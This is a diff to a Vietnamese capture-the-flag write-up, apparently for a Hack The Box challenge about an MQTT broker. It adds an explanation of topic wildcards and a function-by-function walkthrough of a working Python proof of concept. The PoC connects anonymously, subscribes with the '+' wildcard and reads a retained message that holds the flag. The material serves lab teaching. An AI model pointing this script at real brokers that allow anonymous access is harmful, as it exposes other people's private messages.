@@ -170,9 +170,7 @@ Ví dụ topic có thể trông như thế này:
 550e8400-e29b-41d4-a716-446655440000
 ```
 
-Thoạt đầu, mình nghĩ đây là một cơ chế bảo mật hợp lý: nếu topic thay đổi ngẫu nhiên mỗi lần publish, người ngoài sẽ khó mà đoán đúng topic để subscribe.
-
-Nhưng MQTT không bắt người dùng phải biết chính xác topic. Nó hỗ trợ wildcard, và đây chính là điểm mà chúng ta có thể khai thác
+Nhưng MQTT không bắt người dùng phải biết chính xác topic mà có hỗ trợ wildcard , vì vậy không cần thiết phải đoán trúng topic để subcrise.
 
 
 ## Step 6: Flag được publish dưới dạng retained message
@@ -209,6 +207,9 @@ Và trong challenge này, thứ được lưu lại chính là flag.
 
 ## Step 7: Wildcard trong MQTT
 
+Wildcard là ký tự đại diện, dùng để khớp nhiều giá trị thay vì một giá trị cố định.
+
+Trong MQTT, wildcard được dùng khi subscribe topic, để mình không cần biết chính xác toàn bộ tên topic mà vẫn nhận được message phù hợp.
 ### Topic level là gì?
 
 Trong MQTT, topic được chia level bằng dấu `/`.
@@ -335,5 +336,161 @@ while True:
             print(payload.decode(errors="replace"))
             break
 ```
+## Giải thích PoC 
+### `enc_rem(n)`
+
+```python
+def enc_rem(n):
+    out = bytearray()
+    while True:
+        b = n % 128
+        n //= 128
+        if n:
+            b |= 0x80
+        out.append(b)
+        if not n:
+            return bytes(out)
+```
+
+Trong MQTT, sau byte đầu tiên của packet sẽ là trường `remaining length`. Trường này không được lưu theo kiểu số nguyên cố định 1 byte hay 2 byte, mà dùng một kiểu mã hóa biến độ dài riêng của MQTT.
+
+Hàm `enc_rem()` dùng để biến một số nguyên `n` thành đúng định dạng `remaining length` mà broker mong đợi.
+
+Hàm này không phải phần khai thác, nhưng nó cần thiết để script gửi packet hợp lệ.
+
+### `read_packet(io)`
+
+```python
+def read_packet(io):
+    packet_type = io.recvn(1)[0]
+    mult = 1
+    rem_len = 0
+    while True:
+        b = io.recvn(1)[0]
+        rem_len += (b & 0x7f) * mult
+        if not (b & 0x80):
+            break
+        mult *= 128
+    return packet_type, io.recvn(rem_len)
+```
+
+Hàm này dùng để đọc một packet MQTT trả về từ broker.
+
+Nó hoạt động theo ba bước:
+
+1. Đọc byte đầu tiên để biết loại packet
+2. Đọc và giải mã trường `remaining length`
+3. Đọc đúng số byte còn lại của packet
+
+Kết quả trả về gồm:
+
+- `packet_type`: loại packet, ví dụ `CONNACK`, `SUBACK`, `PUBLISH`
+- `body`: phần nội dung của packet
+
+Đây là hàm nền để toàn bộ script có thể “nghe” broker trả lời gì.
+
+### `mqtt_connect(io)`
+
+```python
+def mqtt_connect(io):
+    client_id = b"flag_leaker"
+    vh = b"\x00\x04MQTT\x05\x02\x00\x3c\x00"
+    payload = struct.pack("!H", len(client_id)) + client_id
+    body = vh + payload
+    io.send(b"\x10" + enc_rem(len(body)) + body)
+    packet_type, body = read_packet(io)
+    if packet_type != 0x20 or body[1] != 0:
+        raise RuntimeError(f"CONNECT failed: type={packet_type:#x} body={body.hex()}")
+```
+
+Hàm này gửi packet `CONNECT` tới broker để đăng nhập như một MQTT client bình thường.
+
+Những gì hàm làm:
+
+- đặt `client_id` là `flag_leaker`
+- tự dựng phần variable header của packet `CONNECT`
+- ghép packet lại rồi gửi đi
+- đọc packet trả lời từ broker
+- kiểm tra xem broker có chấp nhận kết nối hay không
+
+Vì challenge bật `allow_anonymous true`, bước này thành công mà không cần username/password.
+
+Đây là bước đầu tiên của exploit: vào được broker như một client hợp lệ.
+
+### `subscribe_plus(io)`
+
+```python
+def subscribe_plus(io):
+    topic = b"+"
+    body = b"\x00\x01\x00" + struct.pack("!H", len(topic)) + topic + b"\x00"
+    io.send(b"\x82" + enc_rem(len(body)) + body)
+    packet_type, body = read_packet(io)
+    if packet_type != 0x90 or body[-1] >= 0x80:
+        raise RuntimeError(f"SUBSCRIBE failed: type={packet_type:#x} body={body.hex()}")
+```
+
+Đây là hàm quan trọng nhất của toàn bộ PoC.
+
+Hàm này gửi packet `SUBSCRIBE` với topic filter là:
+
+```python
+topic = b"+"
+```
+
+Ý nghĩa của nó là:
+
+- client muốn subscribe vào mọi topic có đúng một level
+
+Vì topic chứa flag là một UUID không có dấu `/`, nên nó là topic một-level. Do đó, topic filter `+` sẽ match topic chứa flag.
+
+Sau khi broker chấp nhận subscription, retained message khớp với filter này sẽ được replay về cho client. Đây chính là lúc flag quay trở lại phía attacker.
+
+### `parse_publish(body)`
+
+```python
+def parse_publish(body):
+    topic_len = struct.unpack("!H", body[:2])[0]
+    topic = body[2:2 + topic_len]
+    pos = 2 + topic_len
+    prop_len = body[pos]
+    pos += 1 + prop_len
+    return topic, body[pos:]
+```
+
+Khi broker replay retained message, nó gửi dưới dạng packet `PUBLISH`.
+
+Hàm `parse_publish()` dùng để bóc packet `PUBLISH` thành hai phần dễ dùng hơn:
+
+- `topic`: topic mà message được publish lên
+- `payload`: nội dung thật của message
+
+Hàm này hoạt động bằng cách:
+
+1. Đọc 2 byte đầu để lấy độ dài topic
+2. Cắt ra topic
+3. Bỏ qua phần properties của MQTT v5
+4. Trả về phần còn lại là payload
+
+Trong challenge này, payload chính là thứ mình cần, vì nó chứa flag.
+
+### Phần main cuối script
+
+```python
+io = remote(HOST, PORT)
+mqtt_connect(io)
+subscribe_plus(io)
+
+while True:
+    packet_type, body = read_packet(io)
+    if packet_type >> 4 == 3:
+        topic, payload = parse_publish(body)
+        if b"HTB{" in payload:
+            log.success(f"topic={topic.decode(errors='replace')}")
+            print(payload.decode(errors="replace"))
+            break
+```
+
+Phần cuối script ghép tất cả các hàm lại thành một luồng hoàn chỉnh
+
 Mình đã chạy trên Local, kết quả thu được flag 
 ![](./image/2.png)
